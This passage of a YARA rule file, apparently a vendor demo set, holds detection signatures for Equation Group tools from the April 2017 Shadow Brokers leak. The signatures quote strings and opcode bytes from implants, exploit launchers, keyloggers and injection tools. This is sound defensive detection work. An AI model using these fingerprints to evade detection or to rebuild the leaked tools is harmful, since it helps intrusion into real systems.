      $s3 = "[+] SMB negotiation" fullword ascii
      $s4 = "12345678-1234-ABCD-EF00-0123456789AB" fullword ascii
      $s5 = "Value must end with 0000 (2 NULLs)" fullword ascii
      $s6 = "[*] Configuring Payload" fullword ascii
      $s7 = "[*] Connecting to listener" fullword ascii
      $op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 } 
      $op2 = { eb 59 8b 4c 24 10 68 1c 46 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of ( $s* ) and 1 of ( $op* ) ) or 3 of them
} 

rule EquationGroup_Toolset_Apr17_Gen3_RID3343 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:40:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)" fullword ascii
      $s2 = "[-] Could not set \"CredentialType\"" fullword ascii
      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_yak_RID333B : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "-xd = dump archive data & store in scancodes.txt" fullword ascii
      $x2 = "-------- driver start token -------" fullword wide
      $x3 = "-------- keystart token -------" fullword wide
      $x4 = "-xta = same as -xt but show special chars & store in keys_all.txt" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_AdUser_Implant_RID376E : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $s2 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_RemoteExecute_Implant_RID3A69 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 53 00 63 00 68 00 65 00 64 00 75 00 6C 00 65 00
               00 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00
               65 00 73 00 41 00 63 00 74 00 69 00 76 00 65 00
               00 00 00 00 FF FF FF FF 00 00 00 00 B0 17 00 68
               5C 00 70 00 69 00 70 00 65 00 5C 00 53 00 65 00
               63 00 6F 00 6E 00 64 00 61 00 72 00 79 00 4C 00
               6F 00 67 00 6F 00 6E 00 00 00 00 00 5C 00 00 00
               57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00
               44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00
               6E 00 63 00 61 00 63 00 6E 00 5F 00 6E 00 70 00
               00 00 00 00 5C 00 70 00 69 00 70 00 65 00 5C 00
               53 00 45 00 43 00 4C 00 4F 00 47 00 4F 00 4E } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Banner_Implant9x_RID3831 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:10:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $op1 = { c9 c3 57 8d 85 2c eb ff ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_greatdoc_dll_config_RID39AF : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Projects\\GREATERDOCTOR\\trunk\\GREATERDOCTOR" ascii
      $x2 = "src\\build\\Release\\dllConfig\\dllConfig.pdb" ascii
      $x3 = "GREATERDOCTOR [ commandline args configuration ]" fullword ascii
      $x4 = "-useage: <scanner> \"<cmdline args>\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_scanner_RID34E0 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "+daemon_version,system,processor,refid,clock" fullword ascii
      $x2 = "Usage: %s typeofscan IP_address" fullword ascii
      $x3 = "# scanning ip  %d.%d.%d.%d" fullword ascii
      $x4 = "Welcome to the network scanning tool" fullword ascii
      $x5 = "***** %s ***** (length %d)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std_RID3836 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:11:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 } 
      $op2 = { 44 24 33 6f c6 44 24 34 77 c6 } 
      $op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_tacothief_RID35AD : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "File too large!  Must be less than 655360 bytes." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_ntevt_RID3427 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "c:\\ntevt.pdb" fullword ascii
      $s1 = "ARASPVU" fullword ascii
      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } 
      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } 
      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )
} 

rule EquationGroup_Toolset_Apr17_Processes_Target_RID3873 : APT DEMO EXE FILE T1047 T1057 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1047, T1057, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Select * from Win32_Process" fullword ascii
      $s3 = "\\\\%ls\\root\\cimv2" fullword wide
      $s5 = "%4ls%2ls%2ls%2ls%2ls%2ls.%11l[0-9]%1l[+-]%6s" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_st_lp_RID3418 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Previous command: set injection processes (status=0x%x)" fullword ascii
      $x2 = "Secondary injection process is <null> [no secondary process will be used]" fullword ascii
      $x3 = "Enter the address to be used as the spoofed IP source address (xxx.xxx.xxx.xxx) -> " fullword ascii
      $x4 = "E: Execute a Command on the Implant" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_EpWrapper_RID358C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:17:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* Failed to get remote TCP socket address" fullword wide
      $x2 = "* Failed to get 'LPStart' export" fullword wide
      $s5 = "Usage: %ls <logdir> <dll_search_path> <dll_to_load_path> <socket>" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_DiBa_Target_2000_RID372D : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:27:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "0M1U1Z1p1" fullword ascii
      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } 
      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } 
      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )
} 

rule EquationGroup_Toolset_Apr17_DllLoad_Target_RID3758 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "BzWKJD+" fullword ascii
      $op1 = { 44 24 6c 6c 88 5c 24 6d } 
      $op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 } 
      $op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_EXPA_RID3324 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:35:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* The target is IIS 6.0 but is not running content indexing servicess," fullword ascii
      $x2 = "--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL" fullword ascii
      $x3 = "By default, the shellcode will attempt to immediately connect s$" fullword ascii
      $x4 = "UNEXPECTED SHELLCODE CONFIGURATION ERRORs" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_RemoteExecute_Target_RID39FB : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Win32_Process" fullword ascii
      $s2 = "\\\\%ls\\root\\cimv2" fullword wide
      $op1 = { 83 7b 18 01 75 12 83 63 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_DS_ParseLogs_RID367C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:57:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* Size (%d) of remaining capture file is too small to contain a valid header" fullword wide
      $x2 = "* Capture header not found at start of buffer" fullword wide
      $x3 = "Usage: %ws <capture_file> <results_prefix>" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_Oracle_Implant_RID3780 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 } 
      $op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 } 
      $op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_DmGz_Target_RID362E : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\\\.\\%ls" fullword ascii
      $s3 = "6\"6<6C6H6M6Z6f6t6" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_SetResourceName_RID37EB : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Updates the name of the dll or executable in the resource file" fullword ascii
      $x2 = "*NOTE: SetResourceName does not work with PeddleCheap versions" fullword ascii
      $x3 = "2 = [appinit.dll] level4 dll" fullword ascii
      $x4 = "1 = [spcss32.exe] level3 exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_drivers_Implant_RID3829 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $s2 = "hZwLoadDriver" fullword ascii
      $op1 = { b0 01 e8 58 04 00 00 c3 33 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_Shares_Target_RID3722 : APT DEMO EXE FILE T1047 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:25:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Select * from Win32_Share" fullword ascii
      $s2 = "slocalhost" fullword wide
      $s3 = "\\\\%ls\\root\\cimv2" fullword wide
      $s4 = "\\\\%ls\\%ls" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_ntfltmgr_RID3564 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw" fullword ascii
      $s6 = "w+w;w2w0w6w4w.w(wRw" fullword ascii
      $op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 } 
      $op2 = { ff 15 0b 34 00 00 eb 92 } 
      $op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae } 
      $op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 } 
      $op5 = { 8a 40 01 00 c7 47 70 } 
      $op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 } 
      $op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 4 of them )
} 

rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_RID36F5 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 } 
      $op1 = { 45 33 c9 49 8d 7f 2c 41 ba } 
      $op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_PC_LP_RID3384 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 14:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "* Failed to get connection information.  Aborting launcher!" fullword wide
      $s2 = "Format: <command> <target port> [lp port]" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_RemoteCommand_Lp_RID383C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Failure parsing command from %hs:%u: os=%u plugin=%u" fullword wide
      $s2 = "Unable to get TCP listen port: %08x" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_lp_mstcp_RID3558 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:09:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
      $s2 = "_PacketNDISRequestComplete@12\"" fullword ascii
      $s3 = "_LDNdis5RegDeleteKeys@4" fullword ascii
      $op1 = { 89 7e 04 75 06 66 21 46 02 eb } 
      $op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 } 
      $op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( all of ( $s* ) or all of ( $op* ) ) )
} 

rule EquationGroup_Toolset_Apr17_renamer_RID34E0 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 15:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "FILE_NAME_CONVERSION.LOG" fullword wide
      $s2 = "Log file exists. You must delete it!!!" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_PC_Exploit_RID35CD : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:28:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\\\.\\pipe\\pcheap_reuse" fullword wide
      $s2 = "**** FAILED TO DUPLICATE SOCKET ****" fullword wide
      $s3 = "**** UNABLE TO DUPLICATE SOCKET TYPE %u ****" fullword wide
      $s4 = "YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this..." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17_PC_Level3_Gen_RID368C : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:00:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "S-%u-%u" fullword ascii
      $s2 = "Copyright (C) Microsoft" fullword wide
      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 } 
      $op2 = { 44 24 4e 41 88 5c 24 4f ff } 
      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )
} 

rule EquationGroup_Toolset_Apr17_put_Implant9x_RID3734 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "3&3.3<3A3F3K3V3c3m3" fullword ascii
      $op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 } 
      $op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17_promiscdetect_safe_RID396A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "running on this computer!" fullword ascii
      $s2 = "- Promiscuous (capture all packets on the network)" fullword ascii
      $s3 = "Active filter for the adapter:" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_PacketScan_Implant_RID3907 : APT DEMO EXE FILE {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:46:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff } 
      $op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 } 
      $op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )
} 

rule EquationGroup_Toolset_Apr17_SetPorts_RID353A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
